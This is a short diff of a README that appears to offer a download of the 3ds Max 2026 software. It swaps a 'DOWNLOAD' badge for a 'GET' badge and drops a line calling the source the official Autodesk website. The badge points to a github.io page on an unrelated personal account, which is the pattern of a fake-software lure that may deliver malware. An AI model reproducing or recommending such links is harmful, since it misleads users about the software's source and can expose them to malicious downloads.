@@ -81,11 +81,8 @@ An SSD can improve application and project loading, while additional RAM becomes
 
 ---
 
-# Download
 
-[![DOWNLOAD — 3ds Max](https://img.shields.io/badge/DOWNLOAD-3ds%20Max-2563eb?style=for-the-badge)](https://tudiscostrothmann07.github.io/.github/3ds-Max-2026)
-
-Download 3ds Max from the official Autodesk website.
+[![GET — 3ds Max](https://img.shields.io/badge/GET-3ds%20Max-2563eb?style=for-the-badge)](https://tudiscostrothmann07.github.io/.github/3ds-Max-2026)
 
 ---
 
